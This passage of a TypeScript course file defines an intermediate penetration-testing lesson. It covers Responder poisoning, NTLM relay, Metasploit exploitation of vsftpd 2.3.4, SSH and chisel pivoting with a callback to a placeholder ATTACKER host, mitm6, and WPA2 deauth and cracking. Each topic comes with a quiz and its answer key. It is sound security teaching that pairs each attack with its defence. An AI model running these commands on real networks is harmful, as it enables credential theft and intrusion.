import type { Level } from '../types'

const level: Level = {
  id: 'intermediate',
  title: 'Attacking network protocols and pivoting',
  summary:
    'Turn positioning into impact: multi-vector man-in-the-middle, LLMNR/NBT-NS poisoning with Responder, SMB relay across the network, exploiting vulnerable services to a shell, and — the heart of intermediate networking — pivoting and tunnelling to reach networks your attacker machine cannot touch directly. Plus IPv6 attacks, remote-access and wireless basics, and how all of this is detected. Practised only on your own lab or networks you are authorized to test.',
  outcomes: [
    'Perform multi-vector MITM (ARP, DNS, rogue DHCP) and understand each',
    'Poison LLMNR/NBT-NS with Responder to capture authentication',
    'Relay captured NTLM authentication to gain access',
    'Exploit a vulnerable network service to obtain a shell',
    'Pivot and tunnel through a foothold to reach hidden networks',
    'Explain how these attacks are detected and defended',
  ],
  steps: [
    {
      id: 'rnet-i-01',
      title: 'Multi-vector man-in-the-middle',
      read: `ARP spoofing is one way to become the middle; a capable tester knows several, because different networks and layers call for different vectors. All only on authorized networks.

## The vectors

- **ARP spoofing** (you know this) — layer 2, local segment: lie about MAC-to-IP mappings so victims route through you.
- **DNS spoofing** — once you are in the middle (or can answer faster than the real server), reply to a victim's DNS query with *your* address, sending them to a host you control instead of the real one. Powerful for redirecting a victim to a fake service.
- **Rogue DHCP** — run a DHCP server that answers a client's boot-time "who configures me?" request first, handing out *your* machine as the gateway and DNS server. If you win the race, you become the middle for that client from the moment it joins.
- **Rogue gateway / ICMP redirect** — convince hosts that the best route runs through you.

## The unifying idea

Every MITM vector abuses a protocol that **trusts the first or the loudest answer** with no authentication: ARP trusts any reply, DNS clients trust the first response, DHCP clients trust the first offer. **Become the trusted answer and traffic flows through you.** Naming the vector by the protocol it abuses keeps your thinking clear and tells the defender exactly what to harden.

## Tools

- **bettercap** — a modern framework that does ARP/DNS spoofing, sniffing, and more, scriptable via "caplets."
- **ettercap** — classic MITM suite with plugins.
- **Responder** — for the name-resolution poisoning in the next step (a specialised, high-yield MITM).

## The defence mirror

Each vector has a specific defence: **dynamic ARP inspection** (ARP), **DNSSEC / trusted resolvers** (DNS), **DHCP snooping** (rogue DHCP). All of them add the authentication or trust-anchoring the base protocol lacks. When you choose a MITM vector, you are also naming the control that stops it. In the lab, try a DNS-spoof redirect on top of an ARP MITM and watch a victim resolve a name to your machine.`,
      sample: {
        lang: 'text',
        caption: 'MITM vectors and the protocol trust each abuses',
        code: `VECTOR         LAYER  ABUSES (all trust the first/loudest answer)
ARP spoof      L2     ARP trusts ANY reply -> reroute local traffic
DNS spoof      L7     client trusts FIRST DNS answer -> fake host
rogue DHCP     L2/3   client trusts FIRST DHCP offer -> you = gw+DNS
ICMP redirect  L3     host trusts a "better route" -> through you

DEFENCE (adds the missing trust anchor):
  ARP -> dynamic ARP inspection   DNS -> DNSSEC/trusted resolver
  DHCP -> DHCP snooping           routes -> ignore ICMP redirects`,
        output: `Every MITM vector = "become the trusted answer" for a protocol
that authenticates nothing. Name the vector by the protocol it
abuses, and you name the control that stops it.`,
      },
      question: {
        kind: 'mcq',
        prompt:
          'What do ARP spoofing, DNS spoofing and rogue-DHCP attacks all have in common at a conceptual level?',
        options: [
          'They all require cracking an encryption key first',
          'Each abuses a protocol that trusts the first or loudest answer with no authentication — ARP trusts any reply, DNS clients the first response, DHCP clients the first offer — so becoming that trusted answer routes traffic through the attacker',
          'They only work over Wi-Fi',
          'They all exploit the same single software bug',
        ],
        answer: 1,
        explain:
          'These MITM vectors operate at different layers but share one flaw: they abuse protocols that accept the first or loudest answer without authentication. ARP caches any reply (even unsolicited); DNS clients trust the first response they get; DHCP clients accept the first offer, which can hand out the attacker as gateway and DNS. In every case, becoming the trusted answer reroutes the victim’s traffic through you. That framing also names the defence for each: dynamic ARP inspection, DNSSEC/trusted resolvers, and DHCP snooping all add the trust-anchoring the base protocol lacks. Choosing a vector is also naming the control that stops it.',
        hint: 'Think about what "answer" each protocol accepts, and whether it checks that the answer is genuine.',
      },
    },

    {
      id: 'rnet-i-02',
      title: 'LLMNR/NBT-NS poisoning with Responder',
      read: `On Windows networks, one MITM technique is so productive it deserves its own step: **poisoning name resolution** with **Responder**. It captures authentication from victims without any ARP spoofing at all.

## The flaw: fallback name resolution

When a Windows machine tries to resolve a name and DNS fails (a typo, a stale share, a non-existent host), it falls back to **LLMNR** (Link-Local Multicast Name Resolution) and **NBT-NS** (NetBIOS Name Service): it **broadcasts to the whole local segment** — "does anyone know who \`fileservr\` is?" These protocols have no authentication, so **any** machine can answer.

## The attack

**Responder** listens for these broadcasts and answers *every* one: "yes, that's me!" The victim, trusting the reply, then tries to **authenticate** to Responder (thinking it is the file server it wanted). Because it is a Windows auth attempt, the victim sends its **Net-NTLMv2** response — which Responder captures. You now have a hash to crack offline, harvested purely by *waiting* for a mistyped name.

## Why it is so effective

Networks are full of failed lookups — typos, decommissioned servers, misconfigured scripts, mapped drives to dead hosts. Responder sits quietly and collects authentication from whoever fumbles a name, often including privileged accounts. It requires no exploit and little noise; it just answers questions no one should trust.

## Two outcomes

- **Capture and crack** — take the Net-NTLMv2 hash offline to hashcat; if the password is weak, you have credentials.
- **Capture and relay** — instead of cracking, *relay* the authentication live to another host (the next step). This needs no cracking at all.

## The defence

The fix is simple and total: **disable LLMNR and NBT-NS** via group policy, so the insecure fallback never happens; enforce SMB signing to blunt relay. When you run Responder on an authorized test and catch hashes, the finding writes itself: "LLMNR/NBT-NS enabled → authentication capturable; disable them." In the lab, run Responder, mistype a share name on a Windows VM, and watch the Net-NTLMv2 hash land.`,
      sample: {
        lang: 'bash',
        caption: 'Responder captures authentication from a mistyped name',
        code: `# Listen and answer LLMNR/NBT-NS/mDNS on the interface (lab):
sudo responder -I eth0

# On a Windows victim, someone types \\\\fileservr\\share (a typo).
# DNS fails -> victim broadcasts LLMNR -> Responder answers "me!"
# -> victim authenticates to us -> we capture Net-NTLMv2.`,
        output: `[+] Listening for events...
[SMB] NTLMv2-SSP Client   : 10.0.0.50
[SMB] NTLMv2-SSP Username : CORP\\jsmith
[SMB] NTLMv2-SSP Hash     : jsmith::CORP:1122...<crackable offline>

Harvested by WAITING for a fumbled name. Fix: disable LLMNR +
NBT-NS via GPO; enforce SMB signing. Then relay OR crack.`,
      },
      question: {
        kind: 'mcq',
        prompt:
          'How does Responder capture a victim’s Net-NTLMv2 authentication without exploiting any software vulnerability?',
        options: [
          'It brute-forces the victim’s password over the network',
          'When DNS resolution fails, Windows falls back to unauthenticated LLMNR/NBT-NS broadcasts asking "who is this name?"; Responder answers every one, so the victim tries to authenticate to Responder and sends its Net-NTLMv2 response, which is captured',
          'It cracks the switch to mirror all traffic',
          'It requires the victim to click a malicious link first',
        ],
        answer: 1,
        explain:
          'Responder abuses Windows’ fallback name resolution. When DNS cannot resolve a name (a typo, a dead server, a stale mapped drive), Windows broadcasts an LLMNR or NBT-NS query to the local segment — protocols with no authentication, so any host may answer. Responder answers all of them, claiming to be whatever was asked for; the victim then attempts to authenticate to Responder as if it were the intended server, sending its Net-NTLMv2 response, which Responder captures. No exploit and little noise are needed — just waiting for someone to fumble a name. The captured hash can be cracked offline or relayed live. The fix is to disable LLMNR and NBT-NS by group policy (and enforce SMB signing against relay).',
        hint: 'What does Windows do when DNS fails, and who is allowed to answer that broadcast?',
      },
    },

    {
      id: 'rnet-i-03',
      title: 'Relaying NTLM across the network',
      read: `Cracking a captured hash is optional. **NTLM relay** takes a victim's authentication and forwards it *live* to another server, authenticating as the victim there — no password, no cracking. It is one of the highest-impact network attacks.

## The mechanism (recall the NTLM internals)

A Windows authentication is a challenge-response that is **not bound to the server that issued it** unless signing/EPA is enforced. So when Responder (or a coerced authentication) makes a victim authenticate to you, you don't have to keep the hash — you can **relay** the whole exchange to a *different* target and log in there as the victim. The tool is **ntlmrelayx** (from impacket).

## The classic chain

1. **Coerce or capture** — get a victim to authenticate to you (Responder, or coercion methods like PetitPotam/PrinterBug that *force* a machine to authenticate).
2. **Relay to a target that does not require signing** — SMB on a host with signing disabled, or LDAP on a domain controller, or ADCS web enrollment.
3. **Act as the victim** — dump SAM hashes over SMB, or (relaying to LDAP) grant yourself rights, or (relaying to ADCS) obtain a certificate to impersonate the account.

## Why signing is the whole game

Relay works **only** where the authentication is not bound to the channel. **SMB signing** and **LDAP signing + channel binding (EPA)** bind it, defeating relay. That is why your SMB enumeration noted "signing disabled" as a finding — it is precisely the precondition for this attack. Relaying to a target that *requires* signing simply fails.

## The impact and the fix

A single mistyped name (Responder) plus one host with signing off (relay target) can equal SMB access, credential dumps, or even AD privilege escalation — with no exploit and no cracking. The fix is equally clear: **require signing everywhere**, disable LLMNR/NBT-NS, and restrict who can coerce authentication. In the lab, chain Responder → ntlmrelayx to relay a captured authentication to a signing-disabled SMB target and dump its local hashes.`,
      sample: {
        lang: 'bash',
        caption: 'Relaying captured authentication to a signing-disabled host',
        code: `# Find hosts where SMB signing is NOT required (relay targets):
netexec smb 10.0.0.0/24 --gen-relay-list targets.txt

# Relay captured/coerced auth to those targets, dump SAM on success:
sudo ntlmrelayx.py -tf targets.txt -smb2support

# (Responder answers name queries; its captured auth is relayed here.)`,
        output: `[*] Authenticating against smb://10.0.0.60 as CORP\\jsmith SUCCEED
[*] Dumping local SAM hashes...
Administrator:500:aad3b...:31d6cfe0d16ae931b...
=> access with NO cracking. Precondition: signing NOT required.
Fix: require SMB/LDAP signing + EPA; disable LLMNR/NBT-NS.`,
      },
      question: {
        kind: 'mcq',
        prompt:
          'NTLM relay lets an attacker authenticate to a target as the victim without cracking anything. What is the precondition that makes a host relayable, and the defence?',
        options: [
          'The host must be running an unpatched OS; patching stops relay',
          'The target must not require signing/channel binding — so the victim’s unbound authentication can be forwarded to it — and the defence is to require SMB signing and LDAP signing + channel binding (EPA), which bind the authentication and defeat relay',
          'The attacker must already know the victim’s password',
          'The victim must be an administrator on the attacker’s machine',
        ],
        answer: 1,
        explain:
          'A Windows challenge-response authentication is not cryptographically bound to the server that issued the challenge unless signing (and, for LDAP, channel binding/EPA) is enforced. That lack of binding is exactly what relay exploits: an authentication captured or coerced toward the attacker can be forwarded live to a different server that does not require signing, logging in as the victim with no cracking. So a host is relayable precisely when it does not require signing — which is why "signing disabled" is a key enumeration finding. The defence binds the authentication: require SMB signing everywhere and LDAP signing plus channel binding on domain controllers, and disable LLMNR/NBT-NS to cut off easy capture.',
        hint: 'What did your earlier SMB enumeration flag as the precondition, and what control adds the missing binding?',
      },
    },

    {
      id: 'rnet-i-04',
      title: 'Exploiting a vulnerable service',
      read: `Enumeration eventually finds a service running a **known-vulnerable version**. Turning that into a shell is exploitation — and doing it *safely and understandingly* is the intermediate skill.

## From version to exploit

Your \`-sV\` scan and research identified, say, "vsftpd 2.3.4" or an unpatched SMB. The path to a shell:

1. **Confirm the version and exposure** — make sure the vulnerable service is really that version and reachable in scope.
2. **Find the matching exploit** — searchsploit (offline Exploit-DB), vendor advisories, or a Metasploit module.
3. **Understand what it does** — before running an exploit, read it: what does it send, what does it change, could it crash the service? Never run an exploit you do not understand against a target you care about.
4. **Run it in scope** — get the shell, note exactly what you did.

## Metasploit, briefly

**Metasploit** is the standard exploitation framework: search for a module (\`search vsftpd\`), select it (\`use ...\`), set options (\`set RHOSTS ...\`), choose a payload, and run. It handles the exploit and gives you a session (often a **Meterpreter** shell with rich post-exploitation features). It is powerful and convenient — and, because it is well-known, heavily signatured by defenders (relevant later).

## Payloads: bind vs reverse shells

- A **bind shell** opens a listening port *on the target* for you to connect to — often blocked by inbound firewalls.
- A **reverse shell** makes the *target connect back to you* — usually succeeds because outbound traffic is less filtered. This is why reverse shells are the norm, and why egress filtering is a defence.

## Caution and the mirror

Exploits can crash services; run them only within rules of engagement, and prefer the least disruptive path. The defensive mirror of every exploited service is **patch and reduce exposure**: the vulnerable version should not have been reachable. In the lab, exploit a deliberately vulnerable service (Metasploitable is built for this) to a reverse shell, and note the version→exploit→shell chain you followed.`,
      sample: {
        lang: 'bash',
        caption: 'Version -> exploit -> reverse shell (lab target)',
        code: `# 1. research the version found by -sV
searchsploit vsftpd 2.3.4

# 2-4. Metasploit: pick module, set target, get a session
msfconsole -q
  search vsftpd
  use exploit/unix/ftp/vsftpd_234_backdoor
  set RHOSTS 10.0.0.101
  run              # -> a shell on the target`,
        output: `[*] Command shell session 1 opened (10.0.0.10 -> 10.0.0.101)
id
uid=0(root)  <- foothold obtained

Reverse shell = target connects BACK to you (beats inbound
firewalls). Fix mirror: patch + don't expose the service.
Read/understand any exploit before running it in scope.`,
      },
      question: {
        kind: 'mcq',
        prompt:
          'Why are reverse shells generally preferred over bind shells when exploiting a service?',
        options: [
          'Reverse shells are encrypted and bind shells are not',
          'A bind shell opens a listening port on the target that inbound firewalls usually block, whereas a reverse shell makes the target connect back to the attacker, which typically succeeds because outbound traffic is less filtered — and egress filtering is the corresponding defence',
          'Bind shells only work on Windows',
          'Reverse shells do not require an exploit',
        ],
        answer: 1,
        explain:
          'A bind shell listens on a port on the compromised host and waits for the attacker to connect in — but inbound connections are commonly blocked by the target’s firewall, so this often fails. A reverse shell instead makes the target initiate a connection back to the attacker’s listener; because outbound traffic is usually far less restricted than inbound, this succeeds in most environments, which is why reverse shells are the norm. The defensive mirror is egress filtering — restricting and monitoring outbound connections so a target cannot freely call home. (And always read and understand an exploit before running it in scope, since exploits can crash services.)',
        hint: 'Which direction is the connection, and which direction do firewalls usually block more strictly?',
      },
    },

    {
      id: 'rnet-i-05',
      title: 'Pivoting: reaching hidden networks',
      read: `Here is the idea at the heart of intermediate network attacking: **pivoting**. A compromised host is not just a prize; it is a *doorway* into networks your attacker machine cannot reach directly.

## Why pivoting exists

Real networks are **segmented**. Your attacker VM might sit on a "user" network that can reach the internet but *not* the "server" or "database" networks — firewalls between segments block you. But a machine you have compromised (say a user's workstation, or a web server in a DMZ) often *can* reach those internal segments, because it is meant to. **Pivoting means routing your attacks *through* the compromised host** to reach what it can reach but you cannot.

## The concept in one picture

You → (can reach) → compromised host → (can reach) → internal network. By turning the compromised host into a relay, your tools on the attacker machine can now scan and attack the internal network *as if* you were the compromised host. The foothold becomes your vantage point.

## Ways to pivot

- **Port forwarding** — forward a single port from the internal network back through the foothold to you (reach one internal service).
- **SOCKS proxy pivoting** — the powerful, general method: run a SOCKS proxy through the foothold, then send *any* tool through it (via **proxychains**) to reach the *whole* internal network. Tools: SSH dynamic forwarding, **chisel**, **ligolo-ng**, Metasploit's routing.
- **Multi-hop / double pivot** — chain pivots: through host A to reach host B, compromise B, pivot again to reach a third segment (a skilled-level extension).

## Why it changes everything

Without pivoting, an engagement stops at the perimeter of your segment. With it, one foothold cascades: the workstation reaches the file server, which reaches the domain controller, which reaches the database network. Segmentation is supposed to contain a breach; pivoting is how an attacker defeats weak segmentation, and demonstrating it is often the most valuable finding you deliver — because it shows the *real* blast radius. The next step covers the tunnelling mechanics. In the lab, set up a two-network topology and confirm you cannot reach the second network until you pivot through a foothold on the first.`,
      sample: {
        lang: 'text',
        caption: 'Pivoting: the foothold becomes your vantage point',
        code: `BEFORE pivot (segmented network):
  attacker (10.0.0.0/24)  --X-->  server net (10.0.1.0/24)
       |                          (firewall blocks you)
       +--> compromise a host that CAN reach both:

  attacker --> foothold (10.0.0.50, also on 10.0.1.0/24)
                    |
                    +--> now reaches 10.0.1.0/24 for you

AFTER pivot: your tools tunnel THROUGH the foothold ->
you scan/attack 10.0.1.0/24 as if you were the foothold.`,
        output: `Pivoting routes your attacks through a compromised host to reach
networks you cannot touch directly. One foothold cascades across
segments. Demonstrating it shows the real blast radius of a breach.`,
      },
      question: {
        kind: 'mcq',
        prompt:
          'What is "pivoting" in a network engagement, and why is it so significant?',
        options: [
          'Switching from TCP scans to UDP scans mid-engagement',
          'Routing your attacks through a compromised host to reach network segments your own machine cannot reach directly — significant because it lets one foothold cascade across a segmented network and reveals the real blast radius of a breach',
          'Rotating your attacker IP address to avoid detection',
          'Restarting an exploit that failed the first time',
        ],
        answer: 1,
        explain:
          'Networks are segmented so that a machine on one segment (e.g. the user network) cannot directly reach others (e.g. server or database networks), with firewalls enforcing the boundaries. Pivoting turns a compromised host — which legitimately can reach those internal segments — into a relay, so the attacker’s tools tunnel through it and attack what it can reach. That is why it matters: without pivoting an engagement stops at your segment’s perimeter, but with it a single foothold cascades (workstation → file server → domain controller → database net), demonstrating the true blast radius of a breach. It is often the most valuable thing a tester shows, because it exposes weak segmentation.',
        hint: 'What does a compromised internal host let you reach that your own machine cannot, and why does that cascade?',
      },
    },

    {
      id: 'rnet-i-06',
      title: 'Tunnelling and port forwarding',
      read: `Pivoting needs a mechanism: **tunnelling** carries your traffic through a foothold into a hidden network. Here are the techniques that make it work, all used only within an authorized engagement.

## SSH tunnels (when the foothold has SSH)

SSH gives three forwarding modes, and knowing which is which is essential:

- **Local forward (\`-L\`)** — bring a *remote* service to a local port. \`ssh -L 8080:10.0.1.5:80 user@foothold\` makes \`localhost:8080\` on your machine reach \`10.0.1.5:80\` through the foothold.
- **Remote forward (\`-R\`)** — expose a *local* port on the remote side (useful to bring a callback back through a foothold).
- **Dynamic forward (\`-D\`)** — the powerful one: \`ssh -D 1080 user@foothold\` opens a **SOCKS proxy** on \`localhost:1080\` that routes *anything* through the foothold into its networks.

## proxychains: sending any tool through the pivot

A SOCKS proxy is only useful if your tools use it. **proxychains** forces a tool's traffic through a SOCKS proxy: \`proxychains nmap -sT -Pn 10.0.1.0/24\` scans the internal network *through the foothold*. (Note: through a SOCKS proxy you must use TCP connect scans, \`-sT\`, and skip host discovery, \`-Pn\` — raw-packet SYN scans do not traverse SOCKS.)

## When there is no SSH: chisel and ligolo-ng

Many footholds (especially Windows) have no SSH. Purpose-built pivoting tools solve this:

- **chisel** — creates a tunnel over HTTP/WebSocket between your machine and an agent you run on the foothold, exposing a SOCKS proxy — great when only web ports are allowed out.
- **ligolo-ng** — a modern favourite that presents the remote network as a virtual interface, so your tools reach it *without* proxychains.

## The mental model

You are building a pipe: attacker ⇄ foothold ⇄ internal network. Whatever mechanism builds the pipe, the result is the same — your tools reach the hidden network through the foothold. Then everything you learned (scanning, enumeration, relay, exploitation) applies inside the new segment. In the lab, establish a SOCKS proxy through a foothold (SSH \`-D\` or chisel) and run \`proxychains nmap\` to enumerate the second network you could not previously reach.`,
      sample: {
        lang: 'bash',
        caption: 'Building a pivot pipe and scanning through it',
        code: `# SSH dynamic forward -> SOCKS proxy through the foothold:
ssh -D 1080 user@10.0.0.50           # foothold also on 10.0.1.0/24

# Send any tool through the proxy with proxychains:
proxychains nmap -sT -Pn 10.0.1.0/24   # scan the HIDDEN network!

# No SSH on the foothold? Tunnel over HTTP with chisel:
#   attacker:  ./chisel server -p 8000 --reverse
#   foothold:  ./chisel client ATTACKER:8000 R:socks`,
        output: `Now localhost:1080 is a SOCKS proxy into 10.0.1.0/24.
Through SOCKS: use -sT (connect) and -Pn (no host discovery).
Pipe built: attacker <-> foothold <-> internal net. All your
enumeration/exploitation now works inside the new segment.`,
      },
      question: {
        kind: 'mcq',
        prompt:
          'When scanning a pivoted network through a SOCKS proxy (e.g. via proxychains), why must you use a TCP connect scan (-sT) with -Pn rather than the default SYN scan?',
        options: [
          'Because SYN scans are illegal when pivoting',
          'Because a SOCKS proxy forwards full TCP connections, not raw packets — so raw-packet techniques like SYN scanning and ICMP host discovery cannot traverse it, whereas a connect scan (-sT) uses normal TCP connections and -Pn skips the unsupported discovery',
          'Because -sT is faster than -sS in every situation',
          'Because the foothold blocks all UDP',
        ],
        answer: 1,
        explain:
          'A SOCKS proxy operates at the level of TCP connections: it relays established connections through the foothold, but it cannot carry the hand-crafted raw packets that a SYN scan (-sS) sends, nor the ICMP that host discovery uses. So through a proxy you must use a full TCP connect scan (-sT), which the OS performs as ordinary connections the proxy can forward, and add -Pn to skip host discovery (which also relies on raw/ICMP probes the proxy won’t pass). This is a practical detail of pivoting: once the tunnel is built (SSH -D, chisel, ligolo-ng), your tools reach the hidden segment, but raw-packet features don’t survive the SOCKS hop.',
        hint: 'What does a SOCKS proxy forward — raw packets, or full TCP connections?',
      },
    },

    {
      id: 'rnet-i-07',
      title: 'IPv6 attacks in a v4 world',
      read: `Here is a modern trap: most networks run IPv4 but leave **IPv6 enabled and unmanaged**. Because Windows *prefers* IPv6, an attacker who provides IPv6 services can quietly take over — the classic tool is **mitm6**.

## Why IPv6 is a gift to attackers

- Windows ships with IPv6 **on by default** and prefers it over IPv4 when both are available.
- Most networks do not *use* IPv6, so there is **no legitimate IPv6 DHCP/DNS** and **no monitoring** of it.
- That means an attacker can stand up rogue IPv6 services with **no competition** — nobody else is answering.

## The mitm6 attack

**mitm6** replies to Windows clients' IPv6 configuration requests (DHCPv6), handing out the **attacker as the IPv6 DNS server**. Because Windows prefers IPv6, clients start sending their **DNS queries to the attacker**. From there the attacker redirects victims (e.g. to a rogue WPAD proxy for auto-configuration) and **captures or relays authentication** — often chained straight into **ntlmrelayx** against LDAP on a domain controller, a fast path to serious AD compromise.

## Why it is so effective

It exploits a default nobody thinks about. There is no exploit, no user interaction beyond normal operation, and little noise on the IPv4 network everyone is watching. The attack rides an entire protocol stack that is present but unmanaged — a perfect example of **"disabled-by-use is not disabled-by-config."**

## The defence

- **Disable IPv6 if you do not use it** — or, better, actively **manage and monitor** it (block rogue DHCPv6 with RA Guard / DHCPv6 guard on switches).
- **Disable WPAD** to break the common follow-on redirect.
- **Enforce signing/EPA** so the relayed authentication fails anyway.

The finding writes itself: "IPv6 enabled and unmanaged → rogue DHCPv6/DNS via mitm6 → authentication capture/relay." In the lab, run mitm6 alongside ntlmrelayx and watch Windows clients prefer your rogue IPv6 DNS.`,
      sample: {
        lang: 'bash',
        caption: 'mitm6: exploiting unmanaged IPv6 in an IPv4 network',
        code: `# Become the rogue IPv6 DNS via DHCPv6 (lab, authorized):
sudo mitm6 -d lab.local

# Chain into relay against LDAP on the DC:
sudo ntlmrelayx.py -6 -t ldaps://10.0.0.2 -wh wpad.lab.local -l loot`,
        output: `Windows PREFERS IPv6 -> clients take attacker as their DNS ->
queries flow to us -> WPAD redirect -> auth captured/relayed
to the DC's LDAP. No exploit; rides an unmanaged default.
Fix: disable/manage IPv6 (RA/DHCPv6 guard), disable WPAD,
enforce LDAP signing + channel binding.`,
      },
      question: {
        kind: 'mcq',
        prompt:
          'Why is an IPv4-only network with IPv6 left enabled but unmanaged vulnerable to an attack like mitm6?',
        options: [
          'Because IPv6 is inherently insecure and cannot be protected',
          'Because Windows enables and prefers IPv6 by default, yet the network provides no legitimate IPv6 DHCP/DNS and no monitoring of it — so an attacker’s rogue DHCPv6/DNS answers unopposed and clients start trusting the attacker for name resolution',
          'Because IPv6 addresses are shorter and easier to guess',
          'Because mitm6 cracks the IPv6 encryption',
        ],
        answer: 1,
        explain:
          'The vulnerability is a forgotten default. Windows ships with IPv6 on and prefers it over IPv4 when both are present, but most networks never actually configure or watch IPv6 — so there is no legitimate DHCPv6 or IPv6 DNS competing, and no monitoring on that stack. mitm6 exploits this by answering DHCPv6 and making itself the clients’ IPv6 DNS server; because Windows prefers IPv6, victims send DNS to the attacker, who can redirect them (e.g. via WPAD) and capture or relay authentication, often straight into LDAP relay against a DC. It is "present but unmanaged," not "insecure by nature." Defences: disable or actively manage IPv6 (RA/DHCPv6 guard), disable WPAD, and enforce signing/EPA.',
        hint: 'Which IP version does Windows prefer, and is anyone else answering IPv6 requests on an IPv4-only network?',
      },
    },

    {
      id: 'rnet-i-08',
      title: 'Attacking remote access',
      read: `Networks expose **remote-access services** — RDP, VPN, SSH, VNC, and web admin portals — so people can get in from outside. That same access is a prime target, because it is internet-facing by design.

## RDP (3389) — the Windows remote desktop

- **Exposure** — an internet-facing RDP is a top real-world entry point; attackers spray and brute-force it constantly.
- **Attacks** — credential spraying/stuffing (weak passwords), reuse of harvested/relayed credentials, and, historically, protocol vulnerabilities (e.g. BlueKeep). Once in, RDP gives a full interactive session.
- **Defence** — never expose RDP directly; put it behind a VPN, require MFA, use Network Level Authentication, restrict source IPs, and monitor for brute force.

## VPN — the front door to the internal network

- **Exposure** — a VPN concentrator is designed to be internet-facing and, when authenticated, drops you *inside* the network.
- **Attacks** — credential attacks against the VPN portal, phishing for VPN creds, and exploiting vulnerabilities in the VPN appliance itself (VPN gateways have had many severe CVEs). A compromised VPN credential is often equal to internal network access.
- **Defence** — MFA is essential; patch the appliance promptly; monitor logins for anomalies.

## SSH (22) — powerful and pivot-friendly

- **Attacks** — password brute force/spraying against weak accounts; stolen or weakly-protected keys; and, once in, SSH is an excellent **pivot** point (recall \`-D\`/\`-L\`).
- **Defence** — key-based auth only, no password login, no direct root, fail2ban-style rate limiting.

## The unifying lesson

Remote access trades convenience for a permanent internet-facing target. The recurring theme is **credentials + MFA**: most remote-access compromises are not exotic exploits but weak or reused passwords on a service reachable from anywhere. That is why MFA on every remote-access service is one of the highest-value controls in existence. In the lab (or a CTF), spray a weak credential against an RDP/SSH service and note how MFA would have stopped it cold.`,
      sample: {
        lang: 'text',
        caption: 'Remote-access services: the exposure and the one control',
        code: `SERVICE  PORT   PRIMARY ATTACK              KEY DEFENCE
RDP      3389   spray/stuff weak creds;     behind VPN + MFA + NLA;
                reuse relayed creds         restrict source IPs
VPN      443/*  cred attacks; appliance     MFA + patch appliance
                CVEs -> internal access     promptly
SSH      22     brute/spray; stolen keys;   keys-only, no root,
                great pivot point           rate-limit
web admin *     default/weak creds          MFA, IP allowlist

Recurring theme: most remote-access compromise = weak/reused
credentials on an internet-facing service. MFA stops most of it.`,
        output: `Remote access = a permanent internet-facing target. The highest-
value control across all of them is MFA (plus patch the
appliances). Exotic exploits are rarer than weak passwords.`,
      },
      question: {
        kind: 'mcq',
        prompt:
          'Across RDP, VPN and SSH, what is the single highest-value defensive control, and why?',
        options: [
          'Changing the default port numbers, because attackers only scan defaults',
          'Multi-factor authentication, because most remote-access compromises come from weak or reused credentials on an internet-facing service — MFA defeats a stolen or sprayed password even when it is correct',
          'Disabling logging so attacks cannot be recorded',
          'Using UDP instead of TCP for the services',
        ],
        answer: 1,
        explain:
          'Remote-access services are internet-facing by design, so they are permanently exposed to credential attacks — spraying, stuffing, reuse of harvested or relayed credentials. In the real world, far more remote-access compromises come from weak or reused passwords than from exotic protocol exploits. Multi-factor authentication addresses exactly that: even a correct, stolen, or sprayed password is not enough on its own, so it neutralises the most common attack path across RDP, VPN, and SSH alike. (Patching the appliances — especially VPN gateways, which have had severe CVEs — is the important complement.) Port-changing is trivial to defeat, and disabling logging only helps the attacker.',
        hint: 'What is the most common cause of remote-access compromise, and which control makes a correct-but-stolen password insufficient?',
      },
    },

    {
      id: 'rnet-i-09',
      title: 'Wireless attacks: the basics',
      read: `Wi-Fi is a network you attack over the *air*, which changes the game: no cable is needed, only proximity. This intermediate step covers the core concepts, practised only on **your own** access point.

## The setup

Wireless testing needs a **wireless adapter that supports monitor mode and packet injection** (many built-in cards do not). Monitor mode lets you capture *all* nearby Wi-Fi frames; injection lets you send crafted frames. The **aircrack-ng** suite is the classic toolkit.

## Attacking WPA2-Personal (a pre-shared key)

WPA2-PSK (a Wi-Fi password shared by everyone) is attacked by capturing the **4-way handshake** — the exchange when a client joins — and cracking it **offline**:

1. **Monitor** the target channel and identify the network and a connected client.
2. **Capture the handshake** — either wait for a client to connect, or send a **deauthentication** frame to knock a client off so it reconnects and you capture the handshake it produces.
3. **Crack offline** — the handshake lets you test password guesses with hashcat/aircrack; a weak passphrase falls, a strong one does not.

**PMKID** attacks can sometimes obtain the crackable material from the access point *without even a client*, making capture easier.

## Why the handshake, not the traffic

You are not decrypting live traffic; you are capturing the *material that lets you crack the password offline*. Once you have the passphrase, you can join the network like any client. So WPA2-Personal's security rests entirely on **passphrase strength** — a weak Wi-Fi password is the whole vulnerability.

## Enterprise and the mirror

WPA2/WPA3-**Enterprise** (per-user credentials via RADIUS) is stronger and attacked differently (evil-twin/RADIUS attacks, a skilled topic). The defensive mirror for personal networks is simply a **long, random passphrase** (and WPA3 where possible); for enterprise, proper certificate validation. In the lab, capture the 4-way handshake on your *own* AP (using a deauth to speed it up) and crack a deliberately weak passphrase you set.`,
      sample: {
        lang: 'bash',
        caption: 'Capturing and cracking a WPA2-PSK handshake (your own AP)',
        code: `# Put the adapter in monitor mode:
sudo airmon-ng start wlan0

# Find networks/clients, then capture on the target channel:
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w cap wlan0mon

# Force a reconnect to capture the 4-way handshake (own AP only):
sudo aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF wlan0mon

# Crack the captured handshake offline:
aircrack-ng -w wordlist.txt cap-01.cap`,
        output: `[ WPA handshake: AA:BB:CC:DD:EE:FF ]  <- material captured
KEY FOUND! [ Summer2019 ]              <- weak passphrase falls

You crack the PASSWORD offline; you don't decrypt live traffic.
WPA2-Personal security = passphrase strength. Fix: long random
passphrase (and WPA3). Own AP only.`,
      },
      question: {
        kind: 'mcq',
        prompt:
          'In a WPA2-Personal attack you capture the 4-way handshake (often speeding it up with a deauth). What does capturing the handshake actually give you?',
        options: [
          'The ability to read all live Wi-Fi traffic in real time',
          'The cryptographic material needed to test password guesses offline — so a weak passphrase can be cracked and then used to join the network, meaning WPA2-Personal’s security rests entirely on passphrase strength',
          'Direct administrative access to the access point',
          'The Wi-Fi password in plaintext immediately',
        ],
        answer: 1,
        explain:
          'The 4-way handshake occurs when a client joins a WPA2-PSK network. Capturing it (by waiting, or by sending a deauthentication frame to force a client to reconnect) yields the material against which you can test passphrase guesses offline with hashcat or aircrack-ng. It does not hand you the password directly, nor let you decrypt live traffic — it lets you *crack* the passphrase, after which you can join the network as any client would. Therefore WPA2-Personal’s entire security depends on the passphrase being long and random; a weak one falls quickly. (PMKID attacks can sometimes get crackable material without any client at all.) Practise only on your own access point.',
